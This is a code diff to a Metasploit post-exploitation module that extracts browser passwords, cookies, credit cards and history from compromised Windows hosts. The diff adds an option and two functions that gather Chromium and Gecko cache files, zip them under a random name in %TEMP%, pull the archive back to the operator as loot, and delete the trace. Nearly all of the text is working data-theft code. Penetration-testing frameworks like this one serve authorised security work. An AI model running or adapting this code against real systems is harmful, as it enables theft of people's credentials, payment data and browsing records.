@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Post
           This post-exploitation module extracts sensitive browser data from both Chromium-based and Gecko-based browsers
           on the target system. It supports the decryption of passwords and cookies using Windows Data Protection API (DPAPI)
           and can extract additional data such as browsing history, keyword search history, download history, autofill data,
-          credit card information and installed extensions.
+          credit card information, browser cache and installed extensions.
         },
         'License' => MSF_LICENSE,
         'Platform' => ['win'],
@@ -33,9 +33,10 @@ class MetasploitModule < Msf::Post
     )
 
     register_options([
-      OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data', false]),
-      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction', false]),
-      OptEnum.new('BROWSER_TYPE', [true, 'Specify which browser type to extract data from', 'all', ['all', 'chromium', 'gecko']])
+      OptBool.new('KILL_BROWSER', [false, 'Kill browser processes before extracting data.', false]),
+      OptBool.new('USER_MIGRATION', [false, 'Migrate to explorer.exe running under user context before extraction.', false]),
+      OptEnum.new('BROWSER_TYPE', [true, 'Specify which browser type to extract data from.', 'all', ['all', 'chromium', 'gecko']]),
+      OptBool.new('EXTRACT_CACHE', [false, 'Extract browser cache (may take a long time). It is recommended to set "KILL_BROWSER" to "true" for best results, as this prevents file access issues.', false])
     ])
   end
 
@@ -150,7 +151,12 @@ class MetasploitModule < Msf::Post
 
       browser_version = get_chromium_version("#{base_path}\\AppData\\Local\\#{path}\\User Data\\Last Version")
       print_status("Found #{name}#{browser_version ? " (Version: #{browser_version})" : ''}")
+
       kill_browser_process(name) if datastore['KILL_BROWSER']
+
+      if datastore['EXTRACT_CACHE']
+        process_chromium_cache(profile_path, name)
+      end
 
       local_state = "#{base_path}\\AppData\\Local\\#{path}\\User Data\\Local State"
       encryption_key = get_chromium_encryption_key(local_state)
@@ -202,6 +208,10 @@ class MetasploitModule < Msf::Post
         end
 
         kill_browser_process(name) if datastore['KILL_BROWSER']
+
+        if datastore['EXTRACT_CACHE']
+          process_gecko_cache("#{profile_path}\\#{profile_dir}", name)
+        end
 
         extract_gecko_data("#{profile_path}\\#{profile_dir}", name)
       end
@@ -592,6 +602,80 @@ class MetasploitModule < Msf::Post
     return name_key
   end
 
+  def process_chromium_cache(profile_path, browser)
+    cache_dir = "#{profile_path}\\Cache\\"
+    return unless directory?(cache_dir)
+
+    total_size = 0
+    file_count = 0
+    files_to_zip = []
+
+    session.fs.dir.foreach(cache_dir) do |subdir|
+      next if subdir == '.' || subdir == '..'
+
+      subdir_path = "#{cache_dir}\\#{subdir}"
+
+      if directory?(subdir_path)
+        session.fs.dir.foreach(subdir_path) do |file|
+          next if file == '.' || file == '..'
+
+          file_path = "#{subdir_path}\\#{file}"
+
+          if file?(file_path)
+            file_stat = session.fs.file.stat(file_path)
+            file_size = file_stat.stathash['st_size']
+            total_size += file_size
+            file_count += 1
+            files_to_zip << file_path
+          end
+        end
+      end
+    end
+
+    print_status("#{file_count} cache files found for #{browser}, total size: #{total_size / 1024} KB")
+
+    if file_count > 0
+      temp_dir = session.fs.file.expand_path('%TEMP%')
+      random_name = Rex::Text.rand_text_alpha(8)
+      zip_file_path = "#{temp_dir}\\#{random_name}.zip"
+
+      zip = Rex::Zip::Archive.new
+      progress_interval = (file_count / 10.0).ceil
+
+      files_to_zip.each_with_index do |file, index|
+        file_content = read_file(file)
+        zip.add_file(file, file_content) if file_content
+
+        if (index + 1) % progress_interval == 0 || index == file_count - 1
+          progress_percent = ((index + 1) * 100 / file_count).to_i
+          print_status("Zipping progress: #{progress_percent}% (#{index + 1}/#{file_count} files processed)")
+        end
+      end
+
+      write_file(zip_file_path, zip.pack)
+      print_status("Cache for #{browser} zipped to: #{zip_file_path}")
+
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+      cache_local_path = store_loot(
+        "#{browser_clean}_Cache",
+        'application/zip',
+        session,
+        read_file(zip_file_path),
+        "#{timestamp}_#{ip}_#{browser_clean}_Cache.zip",
+        "#{browser_clean} Cache"
+      )
+
+      file_size = ::File.size(cache_local_path)
+      print_good("└ Extracted Cache to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
+
+      session.fs.file.rm(zip_file_path)
+    else
+      print_status("No Cache files found for #{browser}.")
+    end
+  end
+
   def extract_gecko_data(profile_path, browser)
     process_gecko_logins(profile_path, browser)
     process_gecko_cookies(profile_path, browser)
@@ -687,6 +771,72 @@ class MetasploitModule < Msf::Post
       file_name = store_loot("#{browser_clean}_Extensions", 'text/plain', session, extension_data, "#{timestamp}_#{ip}_#{browser_clean}_Extensions.txt", "#{browser_clean} Extensions")
       file_size = ::File.size(file_name)
       print_good("└ Extracted Extensions to #{file_name} (#{file_size} bytes)")
+    end
+  end
+
+  def process_gecko_cache(profile_path, browser)
+    cache_dir = "#{profile_path.gsub('Roaming', 'Local')}\\cache2\\entries"
+    return unless directory?(cache_dir)
+
+    total_size = 0
+    file_count = 0
+    files_to_zip = []
+
+    session.fs.dir.foreach(cache_dir) do |file|
+      next if file == '.' || file == '..'
+
+      file_path = "#{cache_dir}\\#{file}"
+
+      if file?(file_path)
+        file_stat = session.fs.file.stat(file_path)
+        file_size = file_stat.stathash['st_size']
+        total_size += file_size
+        file_count += 1
+        files_to_zip << file_path
+      end
+    end
+
+    print_status("#{file_count} cache files found for #{browser}, total size: #{total_size / 1024} KB")
+
+    if file_count > 0
+      temp_dir = session.fs.file.expand_path('%TEMP%')
+      random_name = Rex::Text.rand_text_alpha(8)
+      zip_file_path = "#{temp_dir}\\#{random_name}.zip"
+
+      zip = Rex::Zip::Archive.new
+      progress_interval = (file_count / 10.0).ceil
+
+      files_to_zip.each_with_index do |file, index|
+        file_content = read_file(file)
+        zip.add_file(file, file_content) if file_content
+
+        if (index + 1) % progress_interval == 0 || index == file_count - 1
+          progress_percent = ((index + 1) * 100 / file_count).to_i
+          print_status("Zipping progress: #{progress_percent}% (#{index + 1}/#{file_count} files processed)")
+        end
+      end
+
+      write_file(zip_file_path, zip.pack)
+      print_status("Cache for #{browser} zipped to: #{zip_file_path}")
+
+      browser_clean = browser.gsub('\\', '_').chomp('_')
+      timestamp = Time.now.strftime('%Y%m%d%H%M')
+      ip = session.sock.peerhost
+      cache_local_path = store_loot(
+        "#{browser_clean}_Cache",
+        'application/zip',
+        session,
+        read_file(zip_file_path),
+        "#{timestamp}_#{ip}_#{browser_clean}_Cache.zip",
+        "#{browser_clean} Cache"
+      )
+
+      file_size = ::File.size(cache_local_path)
+      print_good("└ Extracted Cache to #{cache_local_path} (#{file_size} bytes)") if file_size > 2
+
+      session.fs.file.rm(zip_file_path)
+    else
+      print_status("No Cache files found for #{browser}.")
     end
   end
 
